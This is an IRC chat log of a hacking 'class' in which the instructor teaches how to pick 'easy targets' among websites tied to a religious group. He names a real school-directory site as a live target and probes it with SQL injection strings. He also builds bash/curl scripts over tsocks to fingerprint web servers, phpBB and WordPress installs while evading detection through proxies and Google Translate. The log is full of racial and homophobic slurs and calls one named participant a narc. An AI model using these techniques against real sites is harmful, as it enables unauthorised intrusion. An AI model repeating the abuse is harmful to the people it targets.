@@ -1,0 +1,892 @@
+Identifying Easy Targets and Information Gathering (by TylerDurden)
+
+Jun 10 20:57:34 <TylerDurden>	ok, let's start shit.
+Jun 10 20:57:47 <dominus>	let's
+Jun 10 20:57:56 <TylerDurden>	requesting +m
+Jun 10 20:58:17 <TransfiniteGreyWizard>	I think I did it wrong
+Jun 10 20:58:23 <TylerDurden>	no
+Jun 10 20:58:24 <TylerDurden>	ur on tor.
+Jun 10 20:58:38 <bob_22>	time for porno...brb
+Jun 10 20:58:40 <TylerDurden>	TransfiniteGreyWizard [~important@LulzCo-8312FFBC.torservers.net] 
+Jun 10 20:58:42 <xRay>	Requesting you GTFO
+Jun 10 20:58:44 <adh>	garrett , what selection of oreilly boogs do you have?
+Jun 10 20:58:45 *	LordKitsuna sets mode +m #school4lulz
+Jun 10 20:58:57 <TylerDurden>	So
+Jun 10 20:58:59 <TylerDurden>	listen up faggots
+Jun 10 20:59:12 <TylerDurden>	this talk will be about scoping out easy targets, and info gathering as you've raped them.
+Jun 10 20:59:12 <LordKitsuna>	TylerDurden, your hop you can set modes :/
+Jun 10 20:59:40 <TylerDurden>	DONT HALF OP ME on the premise of who you think i am.
+Jun 10 20:59:43 <TylerDurden>	i could be a fucking fed.
+Jun 10 20:59:51 <LordKitsuna>	i didnt hop you
+Jun 10 20:59:54 <Mutiny>	You're already hop lol
+Jun 10 20:59:58 <LordKitsuna>	was just sayin
+Jun 10 21:00:24 *	LordKitsuna gives voice to z3rod4ta
+Jun 10 21:00:24 <TylerDurden>	sux.
+Jun 10 21:00:24 <TylerDurden>	ok.
+Jun 10 21:00:29 <TylerDurden>	let's continue.
+Jun 10 21:00:42 <TylerDurden>	We are going to attack live servers in this talk. It is adviced you use a proxy.
+Jun 10 21:00:59 <TylerDurden>	If you inted to do any of this without one, please just go to the local police station and hand yourself in, it'll be less hassle.
+Jun 10 21:01:47 <Mutiny>	I think he went to turn himself in.
+Jun 10 21:01:56 <TylerDurden>	There are a few firefox addons you will need. ServerSpy, LiveHttpheaders, Hackbar.
+Jun 10 21:02:22 <TylerDurden>	Install them as i'm going to assume you have them.
+Jun 10 21:02:52 <TylerDurden>	Ok, so let's say you have a group of lulzy individuals you want to troll.
+Jun 10 21:03:01 *	TylerDurden sets mode -m #school4lulz
+Jun 10 21:03:07 <TylerDurden>	i'm taking suggestions for targets.
+Jun 10 21:03:17 <z3rod4ta>	chinese
+Jun 10 21:03:20 <LordKitsuna>	the test server we have setup
+Jun 10 21:03:33 <LordKitsuna>	you know
+Jun 10 21:03:35 <TylerDurden>	LordKitsuna: contains no dox.
+Jun 10 21:03:35 <kratos>	any cp site
+Jun 10 21:03:36 <LordKitsuna>	for testing
+Jun 10 21:03:40 <LordKitsuna>	oh
+Jun 10 21:03:48 <TylerDurden>	anything with >20k users will do.
+Jun 10 21:03:52 <LordKitsuna>	xboxlive.com
+Jun 10 21:04:01 <TylerDurden>	lol.
+Jun 10 21:04:07 <TylerDurden>	i dont have a week to explain this
+Jun 10 21:04:12 <TransfiniteGreyWizard>	Too big
+Jun 10 21:04:17 <TylerDurden>	ok, a GROUP OF PEOPLE that would be lulzy to attack.
+Jun 10 21:04:20 <llama>	LordKitsuna, is your test server back up?
+Jun 10 21:04:23 <TylerDurden>	i'll find the target sites.
+Jun 10 21:04:31 <LordKitsuna>	llama, never went down
+Jun 10 21:04:38 <TylerDurden>	ok.
+Jun 10 21:04:41 <TylerDurden>	good old christians then?
+Jun 10 21:04:46 <z3rod4ta>	how would we find targets?
+Jun 10 21:04:49 <adh>	why not
+Jun 10 21:04:51 <Mutiny>	godhatesfags.com
+Jun 10 21:04:58 *	TylerDurden sets mode +m #school4lulz
+Jun 10 21:05:02 <TylerDurden>	ok, we have a target, christians.
+Jun 10 21:05:11 <TylerDurden>	Now we're going to scope out easy sites, the n00b way.
+Jun 10 21:05:25 <TylerDurden>	google: christians inurl:.php? inurl:id=
+Jun 10 21:05:44 <TylerDurden>	this is passive info gathering, as long as you use a proxy admins will not notice this.
+Jun 10 21:05:45 <LordKitsuna>	http://www.intoleranceagainstchristians.eu/index.php?id=243
+Jun 10 21:06:00 <TylerDurden>	too small.
+Jun 10 21:06:58 <TylerDurden>	http://www.ourkids.net/school/school-profile.php?id=35%27 i have found a cool target already.
+Jun 10 21:07:14 <Dox>	c++ grammar http://weegen.home.xs4all.nl/eelis/cppgrammar.png
+Jun 10 21:07:21 <z3rod4ta>	http://www.jetzt-tv.net/index.php?id=christianmeyer
+Jun 10 21:07:58 <TylerDurden>	Now we have a target.
+Jun 10 21:08:10 <TylerDurden>	Let's first automate the googling it shall we.
+Jun 10 21:08:11 <Dox>	who?
+Jun 10 21:08:15 <TylerDurden>	We can use google as a webspider.
+Jun 10 21:08:20 <TylerDurden>	http://www.ourkids.net/school/school-profile.php?id=35%27
+Jun 10 21:08:51 <TylerDurden>	Google can search by site. site:www.ourkids.net
+Jun 10 21:09:14 <TylerDurden>	Google is a pain in the arse to automate. so find a commandline prog to do it.
+Jun 10 21:10:16 <TylerDurden>	luckily, we can use a google scraper for this.
+Jun 10 21:10:21 <TylerDurden>	http://www.scroogle.org/cgi-bin/nbbw.cgi
+Jun 10 21:11:00 <Dox>	http://www.scroogle.org/cgi-bin/nbbw.cgi == down
+Jun 10 21:11:00 <z3rod4ta>	lol it said i had use in SSL since i am using tor
+Jun 10 21:11:01 <TylerDurden>	Everyone here knows how to use curl right?
+Jun 10 21:11:25 <z3rod4ta>	no curl here
+Jun 10 21:11:40 <TylerDurden>	fuck, got wget?
+Jun 10 21:12:14 <z3rod4ta>	no but keep going
+Jun 10 21:13:04 <TylerDurden>	ok. we have an easy target, we have google.
+Jun 10 21:13:12 <TylerDurden>	fuck autom8ing this step then.
+Jun 10 21:13:18 <TylerDurden>	WE'LL DO IT BY HAND.
+Jun 10 21:13:47 <Dox>	FUCK IT, WE'LL DO IT LIVE
+Jun 10 21:13:54 <TylerDurden>	http://www.google.com/search?q=site%3Aourkids.net see that it finds all pages related to that site?
+Jun 10 21:13:57 <TylerDurden>	right.
+Jun 10 21:14:07 <TylerDurden>	now that we know how to find SQLI, as in the earlier tutorial.
+Jun 10 21:14:11 <TylerDurden>	we can find vulnerable pages.
+Jun 10 21:14:14 <TylerDurden>	holler at me.
+Jun 10 21:14:56 <Dox>	http://www.ourkids.net/camp/ ??
+Jun 10 21:15:11 <Dox>	Has a form at the bottom
+Jun 10 21:15:12 <TylerDurden>	http://www.ourkids.net/school/school-gallery-image.php?id=6&image=3040%27
+Jun 10 21:15:16 <Mutiny>	Tor button doesn't work with firefox 4 still >:(
+Jun 10 21:15:18 <Dox>	with submit button
+Jun 10 21:15:29 <TylerDurden>	Mutiny: download the GIT version.
+Jun 10 21:15:34 <TylerDurden>	Dox: exactly
+Jun 10 21:15:39 <TylerDurden>	we are looking for any kind of input
+Jun 10 21:15:45 <TylerDurden>	in the url, or in forms.
+Jun 10 21:15:51 <TylerDurden>	In case you fags didn't notice that.
+Jun 10 21:15:58 <TylerDurden>	Now we are going to give it SQL related input.
+Jun 10 21:16:05 <TylerDurden>	' or 1=1;-- etc.
+Jun 10 21:16:10 <TylerDurden>	i prefer to use and myself.
+Jun 10 21:16:12 <Dox>	What kind of MySQL code are we going to use?
+Jun 10 21:16:22 <TylerDurden>	Dox: mainly load_file.
+Jun 10 21:16:26 <z3rod4ta>	http://www.ourkids.net/calendar/event_calendar_month.php
+Jun 10 21:16:27 <TylerDurden>	ok.
+Jun 10 21:16:34 <Dox>	idk load_fire
+Jun 10 21:16:44 <TylerDurden>	so you know how to find a bunch of vulnerable urls, and how to find SQLI.
+Jun 10 21:16:52 <TylerDurden>	holler at me if you dont know how 2 find sqli.
+Jun 10 21:16:57 <TylerDurden>	so i can dick slap you.
+Jun 10 21:17:11 <Mutiny>	Dick slap me please.
+Jun 10 21:17:14 <Mutiny>	>.>
+Jun 10 21:17:34 <TylerDurden>	http://www.immortaltechnique.co.uk/Thread-Ultimate-SQLI-Tutorial SO LEET.
+Jun 10 21:17:35 <TylerDurden>	ok.
+Jun 10 21:17:40 <Mutiny>	oh ty
+Jun 10 21:18:00 <TylerDurden>	this is neither high tech nor advanced.
+Jun 10 21:18:05 <TylerDurden>	but it's how you can rape sony.
+Jun 10 21:18:46 <TylerDurden>	tsocks curl http://www.ourkids.net/robots.txt -> 404
+Jun 10 21:18:50 <TylerDurden>	we're now going to make a bash script with default shit to gather.
+Jun 10 21:19:02 <TylerDurden>	robots.txt contains shit admins want to hide from search engines.
+Jun 10 21:19:12 <TylerDurden>	since we use google as a spider, that's shit we have to search trough by hand.
+Jun 10 21:19:24 <TylerDurden>	(which we're not going today)
+Jun 10 21:19:29 <TylerDurden>	type vim niggers.sh or something like it.
+Jun 10 21:21:06 <TylerDurden>	tsocks curl -I http://www.ourkids.net/robots.txt 
+Jun 10 21:21:10 <TylerDurden>	see the output of that command?
+Jun 10 21:21:14 <TylerDurden>	Server: Apache/2.0.52 (Red Hat) mod_perl/1.99_16 Perl/v5.8.5 DAV/2 PHP/5.2.12 mod_python/3.1.3 Python/2.3.4 mod_ssl/2.0.52 OpenSSL/0.9.7a JRun/4.0
+Jun 10 21:21:43 <TylerDurden>	everyone with me?>
+Jun 10 21:22:07 <z3rod4ta>	no, where the fuck are you typing those commands at?
+Jun 10 21:22:13 <TylerDurden>	godammit.
+Jun 10 21:22:16 <TylerDurden>	a fucking terminal.
+Jun 10 21:22:21 <z3rod4ta>	at nigges.sh script?
+Jun 10 21:22:34 <z3rod4ta>	ok
+Jun 10 21:22:47 <TylerDurden>	just to test it.
+Jun 10 21:22:53 <TylerDurden>	you will put them in niggers.sh later.
+Jun 10 21:23:01 <z3rod4ta>	ight
+Jun 10 21:23:08 <TylerDurden>	i assume you are either using a goddamn window manager or terminal multiplexer.
+Jun 10 21:23:31 <null->	screen Ñ=
+
+*** EDITORS NOTE: ryan1918 IS A FAGGOT AND A NARC ***
+
+Jun 10 21:23:42 *	ChanServ gives channel half-operator status to ryan1918
+Jun 10 21:23:47 <ryan1918>	hmm
+Jun 10 21:24:22 <TylerDurden>	any more basic questions about bash?
+Jun 10 21:24:30 <garrett>	i wish i had a netbook
+Jun 10 21:24:32 <garrett>	:<
+Jun 10 21:24:37 <Mutiny>	I wish i had a jetpack
+Jun 10 21:24:48 <garrett>	i wish a had a jetpack that was also a netbook
+Jun 10 21:24:49 <Dox>	I wish I had rocket boots
+Jun 10 21:24:57 <Dox>	and a netbook
+Jun 10 21:25:07 <ryan1918>	i wish i had sum better drugs
+Jun 10 21:25:13 <Dox>	netbooks = under $200
+Jun 10 21:25:30 <ryan1918>	i got 2 netbooks
+Jun 10 21:25:37 <TylerDurden>	"$(tsocks curl --silent -I http://www.ourkids.net/robots.txt | grep "404 Not Found" )" ==""  shows if there's a robots.txt
+Jun 10 21:25:41 <garrett>	man this beer is tasty
+Jun 10 21:25:41 <Dox>	mail garrett one
+Jun 10 21:25:43 <TylerDurden>	we'll use this trick to find any file.
+Jun 10 21:25:49 <ryan1918>	bbl
+Jun 10 21:25:50 <TylerDurden>	also stop spamming.
+Jun 10 21:26:37 *	ryan1918 removes ban on *!*Guantenk@*.DB5C8CD3.950BBD03.IP
+Jun 10 21:26:37 *	ryan1918 removes ban on *!*fliprez@*.sub-166-144-174.myvzw.com
+Jun 10 21:26:37 *	ryan1918 removes ban on *!~hellother@34D6CFB5.A3F8D5B9.49BE9084.IP
+Jun 10 21:26:37 *	ryan1918 removes ban on Snafu!*@*
+Jun 10 21:26:38 *	ryan1918 removes ban on *!John123@2082E06A.24D6463C.2B8F0750.IP
+Jun 10 21:26:38 *	ryan1918 removes ban on *!root@LulzCo-66EC7A8B.eastridgetn.gov
+Jun 10 21:26:38 *	ryan1918 removes ban on *!krashed@LulzCo-E2836C85.crownpoint.in.gov
+Jun 10 21:26:38 *	ryan1918 removes ban on *!*Nigr0@*.zionism
+Jun 10 21:26:38 *	ryan1918 removes ban on notacop_honest!*@*
+Jun 10 21:26:43 <TylerDurden>	file_exists(){ "$(tsocks curl --silent -I http://www.ourkids.net/robots.txt | grep "404 Not Found" )" =="" 
+Jun 10 21:26:46 <TylerDurden>	}
+Jun 10 21:26:58 <TylerDurden>	bash parametrisation lets us use $1 for the url.
+Jun 10 21:27:13 <TylerDurden>	making "$(tsocks curl --silent -I $1 | grep "404 Not Found" )" =="" 
+Jun 10 21:28:10 <TylerDurden>	file_exists(){ "$(tsocks curl --silent -I $1 | grep "404 Not Found" )" =="" 
+Jun 10 21:28:14 <TylerDurden>	}
+Jun 10 21:28:16 <TylerDurden>	file_exists http://www.ourkids.net/robots.txt || echo aids
+Jun 10 21:28:26 <TylerDurden>	now chmod +x niggers.sh && ./niggers.sh
+Jun 10 21:28:40 <TylerDurden>	you now have a shell script that checks if robots.txt exists.
+Jun 10 21:31:29 <TylerDurden>	now that you can check for robots.txt automagically
+Jun 10 21:31:35 <TylerDurden>	there's info to pull from the headers, automagically.
+Jun 10 21:31:40 <TylerDurden>	same shit, use bash.
+Jun 10 21:31:47 <TylerDurden>	i'll give you 2 minutes to come up with a way.
+Jun 10 21:31:50 <TylerDurden>	after that i'll post my code.
+Jun 10 21:32:37 <z3rod4ta>	livehttpheader?
+Jun 10 21:32:46 <TylerDurden>	we're automating shit
+Jun 10 21:32:56 <TylerDurden>	the point is that we do this once by hand.
+Jun 10 21:33:01 <TylerDurden>	and then all by bash scripting.
+Jun 10 21:34:46 *	TylerDurden sets mode -m #school4lulz
+Jun 10 21:34:51 <TylerDurden>	well, anyone got a script?:P
+Jun 10 21:35:17 *	Mutiny wishes
+Jun 10 21:35:40 *	JBAIT thinks tyler is tooooooo optimistic
+Jun 10 21:36:05 <TylerDurden>	ok.. what about message board systems.
+Jun 10 21:36:08 <TylerDurden>	how the fuck do you identify those.
+Jun 10 21:36:16 <TylerDurden>	wordpress, how do you identify it?
+Jun 10 21:36:25 <TylerDurden>	protip: if you don't know firefox->view source.
+Jun 10 21:37:11 <TylerDurden>	in general, any line with "version" in it might be important.
+Jun 10 21:37:16 <TylerDurden>	;)
+Jun 10 21:37:48 <zone>	grep + sed?
+Jun 10 21:38:01 <TylerDurden>	exactly.
+Jun 10 21:38:19 *	zone works on his sed
+Jun 10 21:38:31 <Mutiny>	I identify wordpress by typing /wp-admin after a url
+Jun 10 21:38:45 <Mutiny>	:L
+Jun 10 21:39:08 <TylerDurden>	exactly
+Jun 10 21:39:11 <TylerDurden>	more suggestions?
+Jun 10 21:39:13 <Mutiny>	oh
+Jun 10 21:39:18 <Mutiny>	i thought i was a newb for saying that
+Jun 10 21:39:19 <Mutiny>	XD
+Jun 10 21:39:23 <TylerDurden>	this is newb shit.
+Jun 10 21:39:28 <TylerDurden>	suggestions people.
+Jun 10 21:39:36 <TylerDurden>	/admin/ might be important
+Jun 10 21:39:39 <TylerDurden>	:P
+Jun 10 21:39:47 <TylerDurden>	phpbb for instance, SMF, shit like that.
+Jun 10 21:40:14 <zone>	so identify caracteristic folders of those content managers
+Jun 10 21:40:22 <zone>	if found
+Jun 10 21:40:24 <zone>	print an info
+Jun 10 21:40:29 <God>	anyone here every ran into " Broken SKA"
+Jun 10 21:42:10 <Dox>	TylerDurden http://th3j35t3r.wordpress.com/wp-login.php?redirect_to=http%3A%2F%2Fth3j35t3r.wordpress.com%2Fwp-admin%2F&reauth=1
+Jun 10 21:42:14 <Dox>	its needs pwned
+Jun 10 21:42:22 <Mutiny>	lolololololololo
+Jun 10 21:42:27 <zone>	lol
+Jun 10 21:42:55 <TylerDurden>	ok http://pastebin.com/NGDd1b59 how2 get files in bash.
+Jun 10 21:42:58 <zone>	actually some of his buddies might be reading
+Jun 10 21:43:00 <zone>	:D
+Jun 10 21:43:04 *	TylerDurden sets mode +m #school4lulz
+Jun 10 21:43:14 <Dox>	I wish they would speak up
+Jun 10 21:43:27 <TylerDurden>	now that we know how to see if a file exists, let's identify server versions.
+Jun 10 21:43:28 <Dox>	and catch th3 ban h4amm3rz
+Jun 10 21:44:29 <Dox>	zone, they would have to come here to learn. homeboy has no skill
+Jun 10 21:45:37 *	LordKitsuna gives voice to zone
+Jun 10 21:46:18 <zone>	thx
+Jun 10 21:46:30 <zone>	line should be
+Jun 10 21:47:00 <zone>	tsocks curl --silent -I http://www.ourkids.net/robots.txt | grep Server
+Jun 10 21:47:10 <zone>	but that would pull out a shitload of info
+Jun 10 21:47:15 <zone>	needs to be cutted
+Jun 10 21:47:26 <TylerDurden>	exactly.
+Jun 10 21:49:01 <LordKitsuna>	what more info/= better ?
+Jun 10 21:49:13 <TylerDurden>	no.
+Jun 10 21:50:16 <z3rod4ta>	no because we are only checking for robot.txt
+Jun 10 21:50:21 <z3rod4ta>	correct?
+Jun 10 21:50:43 <Dox>	no more info == being noisy
+Jun 10 21:50:56 <z3rod4ta>	got it.
+Jun 10 21:51:19 <LordKitsuna>	how can that be it clearly says silent in the flags (jkjk)
+Jun 10 21:52:28 <TylerDurden>	http://pastebin.com/z36pbYuf
+Jun 10 21:52:39 <TylerDurden>	that's already a bit of info, not?
+Jun 10 21:52:42 <zone>	I didnt did this one but works
+Jun 10 21:52:44 <TylerDurden>	a 404 might give more info.
+Jun 10 21:52:47 <z3rod4ta>	TylerDurden: when running niggers.sh after chmod +x where would that output the info?
+Jun 10 21:52:53 <zone>	tsocks curl --silent -I http://www.ourkids.net/robots.txt | grep Server | sed 's/ /\n/g' | grep Apache
+Jun 10 21:52:55 <TylerDurden>	stdout.
+Jun 10 21:53:15 <TylerDurden>	a 404 page would get us more info, not?>
+Jun 10 21:53:20 <zone>	aye
+Jun 10 21:53:44 <TylerDurden>	well, let's CURL a 404 page!
+Jun 10 21:54:24 <TylerDurden>	ok, except for a 404, we're going to curl for ws_ftp logs.
+Jun 10 21:54:42 <TylerDurden>	we might as well try to get the source to index.php with a ngix null byte exploit
+Jun 10 21:54:45 <LordKitsuna>	a 404 is just any page not found right?
+Jun 10 21:54:49 <TylerDurden>	yup.
+Jun 10 21:54:55 <LordKitsuna>	oh then we can just be like http://www.ourkids.net/sdfsdfksdgfskdjfhasdadioashdsi
+Jun 10 21:55:05 <TylerDurden>	exactly.
+Jun 10 21:55:10 <Mutiny>	http://www.ourkids.net/wesuxdix
+Jun 10 21:55:25 <LordKitsuna>	Mutiny, no thats a real page
+Jun 10 21:55:41 <Mutiny>	oh yes, i apologize.
+Jun 10 21:55:47 <LordKitsuna>	thats ok
+Jun 10 21:55:53 <TylerDurden>	http://www.stallman.org/aids example of a 404
+Jun 10 21:56:35 *	ChanServ sets mode +q #school4lulz Fox
+Jun 10 21:57:25 <TylerDurden>	we'd grep for apache tere.
+Jun 10 21:57:29 <TylerDurden>	tsocks curl --silent $1/niggertitsdicksAAAAAAABB  | grep "Apache"
+Jun 10 21:57:43 <TylerDurden>	for instance that with $1=stallman.org gives us his apache version.
+Jun 10 21:58:14 <Mutiny>	are you afraid /niggertitsdicks will be real? XD
+Jun 10 21:58:23 <TylerDurden>	no.
+Jun 10 21:58:28 <LordKitsuna>	watch as this site is somehow really well secured, id laugh
+Jun 10 21:58:39 <TylerDurden>	oh it isnt.
+Jun 10 21:58:49 <TylerDurden>	i made sure of that by picking the target myself.
+Jun 10 21:59:00 TylerDurden TransfiniteGreyWizard t tminus torify Tony tafiller testosin thatsnice TR0|\| tully Tully_ 
+Jun 10 21:59:20 <LordKitsuna>	when you are not busy TylerDurden you should check our testsite been hardening it lol point out flaws/holes in it
+Jun 10 21:59:34 <zone>	TylerDurden, how to make cases?
+Jun 10 21:59:38 <zone>	Case apache
+Jun 10 21:59:42 <zone>	Case nginx
+Jun 10 21:59:45 <zone>	Case whatever
+Jun 10 22:00:02 <TylerDurden>	basically set a numeric flag
+Jun 10 22:00:17 <TylerDurden>	| grep "Apache" && myCase=1
+Jun 10 22:00:22 <TylerDurden>	then work from myCase on
+Jun 10 22:00:26 <TylerDurden>	but that's not really usefull here.
+Jun 10 22:00:32 <TylerDurden>	as i'm trying to cover the basics
+Jun 10 22:00:36 *	TylerDurden sets mode -m #school4lulz
+Jun 10 22:00:40 <zone>	just wondering
+Jun 10 22:00:43 <zone>	sowies
+Jun 10 22:00:51 <TylerDurden>	yeah, still follow ppl?
+Jun 10 22:00:58 <TylerDurden>	this might b harsh on bash noobs.
+Jun 10 22:01:24 <garrett>	sec
+Jun 10 22:01:28 <garrett>	ima upload a nice book
+Jun 10 22:01:50 <garrett>	http://www.mediafire.com/?mdehk8ovvhoxvs6
+Jun 10 22:01:52 <garrett>	nm had it upped
+Jun 10 22:02:02 <LordKitsuna>	garrett, is it a pdf?
+Jun 10 22:02:08 <garrett>	yes
+Jun 10 22:02:13 <LordKitsuna>	then fuck it lol, hate pdf's with a burning passion
+Jun 10 22:02:15 <TylerDurden>	http://www.hackersforcharity.org/ghdb/ google dorks you can do  on the site.
+Jun 10 22:02:19 <adh>	thank 'e garrett
+Jun 10 22:02:24 <Fox>	:3
+Jun 10 22:02:25 <garrett>	LordKitsuna: w/e
+Jun 10 22:02:27 <garrett>	i like chms too
+Jun 10 22:02:35 <garrett>	but we cant be so lucky with every rls
+Jun 10 22:02:36 <xRay>	What was todays class?
+Jun 10 22:02:46 *	start is now known as end
+Jun 10 22:03:49 <z3rod4ta>	xRay: asm
+Jun 10 22:03:57 <xRay>	Mmm
+Jun 10 22:04:21 LordKitsuna llama LordBulletproofGangster L1nk3r leon Lev Liberty lighthouse 
+Jun 10 22:05:32 <TylerDurden>	tsocks curl --silent $1/niggertitsdicksAAAAAAABB  | grep "Apache"
+Jun 10 22:05:32 <TylerDurden>	tsocks curl --silent $1/niggertitsdicksAAAAAAABB  | grep "IIS"
+Jun 10 22:05:32 <TylerDurden>	tsocks curl --silent $1/niggertitsdicksAAAAAAABB  | grep "ngix"
+Jun 10 22:05:33 <TylerDurden>	that should do for now.
+Jun 10 22:05:50 <TylerDurden>	ok, so now we should be able to identify most web servers.
+Jun 10 22:06:00 <TylerDurden>	everyone follow?
+Jun 10 22:06:03 <zone>	yep
+Jun 10 22:06:14 <TylerDurden>	ok, let's do phpbb forums
+Jun 10 22:06:21 <TylerDurden>	usual forum urls: /forum /forums /messageboard
+Jun 10 22:07:33 <TylerDurden>	http://$1/docs/CHANGELOG.html
+Jun 10 22:07:46 <TylerDurden>	that's how you determine a phpbb version.
+Jun 10 22:07:56 <TylerDurden>	you might also want to grab the copyright line for shits n giggles.
+Jun 10 22:11:11 <TransfiniteGreyWizard>	I just heard a politician tell the truth
+Jun 10 22:11:17 <TransfiniteGreyWizard>	What the fuck is going on
+Jun 10 22:11:33 <kratos>	um
+Jun 10 22:11:34 <kratos>	it's nginx
+Jun 10 22:11:36 <kratos>	^
+Jun 10 22:11:50 <TransfiniteGreyWizard>	"Don't worry about china, theres actually nothing to worry about. We are 9-11x as wealthy"
+Jun 10 22:11:59 <TylerDurden>	thanks for fixin' the typo for me.
+Jun 10 22:12:14 <kratos>	np
+Jun 10 22:12:24 <kratos>	just about to go to bed, gnight :)
+Jun 10 22:12:27 *	God has kicked zone from #school4lulz (zone)
+Jun 10 22:12:47 <LordKitsuna>	why did you kick zone god?
+Jun 10 22:12:54 <God>	trying to gte his attention
+Jun 10 22:13:08 <LordKitsuna>	that's an assholish way of doing it
+Jun 10 22:13:09 <TylerDurden>	http://pastebin.com/7BieznDz this is your script up till now
+Jun 10 22:13:10 <LordKitsuna>	highfive
+Jun 10 22:13:12 <TylerDurden>	if it's not COPY IT.
+Jun 10 22:13:56 <thatsnice>	I have a question
+Jun 10 22:14:05 <TylerDurden>	yeah?
+Jun 10 22:14:26 <thatsnice>	im not sure if you told it, but what is the point of the robots.txt
+Jun 10 22:14:26 <xRay>	TylerDurden the methods you've used work to an extent but with something like lighthttpd it may just redirect invalid links to the main page.. If you get that your best bet is exec nmap -sV -p 80 www.site.com
+Jun 10 22:14:35 <haut>	Why waste so much bandwidth for just one target
+Jun 10 22:14:40 <thatsnice>	i might not have been here when you explained it
+Jun 10 22:14:54 <xRay>	Some times people put admin dir's in the robots.txt thinking it will stop it showing up in google.
+Jun 10 22:14:55 <adh>	Websites use robots.txt as instructions for search engines, what to include/exclude from search results
+Jun 10 22:14:56 <haut>	thatsnice: it's used to tell webspiders to exclude certain directories
+Jun 10 22:15:06 <haut>	thatsnice: like, tell the googlebot to not index that stuff
+Jun 10 22:15:20 *	LordKitsuna sets mode +m #school4lulz
+Jun 10 22:15:26 <LordKitsuna>	too much stuff need to read it all
+Jun 10 22:15:28 <TylerDurden>	xRay: i know, but we dont want to nmap just yet.
+Jun 10 22:15:35 <TylerDurden>	xRay: nmap is more intrusive than a 404
+Jun 10 22:15:45 *	LordKitsuna sets mode -m #school4lulz
+Jun 10 22:15:46 <LordKitsuna>	k
+Jun 10 22:15:51 <xRay>	Yeah that's true
+Jun 10 22:16:04 <TylerDurden>	ok, the point of this is INFORMATION GATHERING PEOPLE.
+Jun 10 22:16:13 <TylerDurden>	you want to be AS SILENT AS POSSIBLE.
+Jun 10 22:16:18 <TylerDurden>	if possible USE GOOGLE TO GET THE INFO
+Jun 10 22:16:31 <TylerDurden>	also: google translate is a good proxy.
+Jun 10 22:16:32 <TylerDurden>	:P
+Jun 10 22:16:37 <adh>	haha
+Jun 10 22:16:58 <bob_22>	Thanks for the class Tyler, gotta crash. paste it up somewhere. 
+Jun 10 22:16:59 <LordKitsuna>	TylerDurden, would using Google translator make it look like its google grabbing shit on the server end? (i dont know shit so forgive me if thigns i say are stupid)
+Jun 10 22:17:04 <LordKitsuna>	of
+Jun 10 22:17:05 <LordKitsuna>	oh
+Jun 10 22:17:10 <LordKitsuna>	damnit you said that as i was typing
+Jun 10 22:17:17 <LordKitsuna>	nvm
+Jun 10 22:17:20 <s4>	I missed everything, a paste would be nice :)
+Jun 10 22:17:37 <TylerDurden>	yes it would:P
+Jun 10 22:17:47 <TylerDurden>	that's why i use it.
+Jun 10 22:17:56 <z3rod4ta>	s4 i think the class will posted at pastbin after its done.
+Jun 10 22:18:00 <TylerDurden>	you see, webmasters expect google in their logs.
+Jun 10 22:18:06 *	TylerDurden sets mode +m #school4lulz
+Jun 10 22:18:14 <TylerDurden>	so google won't stand out too much.
+Jun 10 22:18:20 <TylerDurden>	this is why google translate as a proxy is a good idea.
+Jun 10 22:18:33 <TylerDurden>	let's factor in a way to do this easily into our script, shall we?
+Jun 10 22:18:37 <TylerDurden>	we make a generic getpage function.
+Jun 10 22:22:47 <TylerDurden>	http://pastebin.com/N0EXahxR your script up till now.
+Jun 10 22:23:38 <TylerDurden>	as you might have noticed, i grabbed the phpbb copyright line too real quick.
+Jun 10 22:23:45 <TylerDurden>	if you can't find any real info, use the copyright line.
+Jun 10 22:23:50 <TylerDurden>	it at least gives you a year in which it was built.
+Jun 10 22:24:22 <TylerDurden>	invision pro boards are another usual target.
+Jun 10 22:27:25 <Mutiny>	it kind of makes me nervous seeing some of the files I do... :-/
+Jun 10 22:27:30 <Mutiny>	http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=intitle%3Aindex.of.private#sclient=psy&hl=en&source=hp&q=intitle:index.of.admin&aq=f&aqi=&aql=&oq=&pbx=1&bav=on.2,or.r_gc.r_pw.&fp=7ff7d408b5d36764&biw=1600&bih=850
+Jun 10 22:27:37 <TylerDurden>	:)
+Jun 10 22:27:41 <Mutiny>	Index of /admin/gov
+Jun 10 22:28:28 <TylerDurden>	hehe.
+Jun 10 22:28:41 <TylerDurden>	some .govs have mad robots.txt files too.
+
+Jun 10 22:28:48 <TylerDurden>	the goal is to automate this shit.
+Jun 10 22:28:48 <z3rod4ta>	TylerDurden: will this be posted later, need to get my kid into bed
+Jun 10 22:28:48 <Mutiny>	haha
+Jun 10 22:29:00 <TylerDurden>	z3rod4ta: i
+Jun 10 22:29:06 <TylerDurden>	i'm sure someone is copying it.
+Jun 10 22:29:21 <Mutiny>	If not I can always go back
+Jun 10 22:29:34 <Mutiny>	at least until I close the window XD
+Jun 10 22:29:43 <LordKitsuna>	my client logs everything so if its not posted i can go back and grab it
+Jun 10 22:29:50 <TylerDurden>	k.
+Jun 10 22:29:56 <TylerDurden>	i keep no logs for obvious reasons.
+Jun 10 22:29:58 <z3rod4ta>	than have a good night guys
+Jun 10 22:30:00 <TylerDurden>	now, back to the code.
+Jun 10 22:30:11 <LordKitsuna>	TylerDurden, cus of all the porn?
+Jun 10 22:31:40 <Mutiny>	haha intitle:index.of.porn is pretty entertaining
+Jun 10 22:32:11 <TylerDurden>	http://pastebin.com/rVWTBAx9 script so far.
+Jun 10 22:32:23 <TylerDurden>	as you can see, we're now going after wordpress.
+Jun 10 22:34:03 <Mutiny>	http://www.theageofmammals.com/secret/domain/Stadium_Seating.jpg lmfao ghetto awesome
+Jun 10 22:34:26 <LordKitsuna>	^thats amazign
+Jun 10 22:34:45 <Mutiny>	It is isn't it?
+Jun 10 22:34:53 <LordKitsuna>	i could so do that too
+Jun 10 22:34:59 <LordKitsuna>	i have the tools/extra wood
+Jun 10 22:35:00 <garrett>	Perl can help me iterate over the cocks in a given stall, mark each as sucked or unsucked and sort them by length.  Then I can be gay with piss and go home and take a nap.
+Jun 10 22:35:52 <TylerDurden>	file_exists $1/wp-login.php && echo "Wordpress installed."
+Jun 10 22:36:00 <TylerDurden>	everyone follow up till now?
+Jun 10 22:36:14 *	LordKitsuna sets mode -m #school4lulz
+Jun 10 22:36:29 <hatter>	<3 garrett 
+Jun 10 22:36:42 <TylerDurden>	so, what we're doing is finding version dorks for a lot of pieces of software.
+Jun 10 22:37:05 *	LordKitsuna sets mode +m #school4lulz
+Jun 10 22:37:19 <hatter>	lol
+Jun 10 22:37:19 <hatter>	wow
+Jun 10 22:37:26 <hatter>	why not just teach fuzzing tyler?
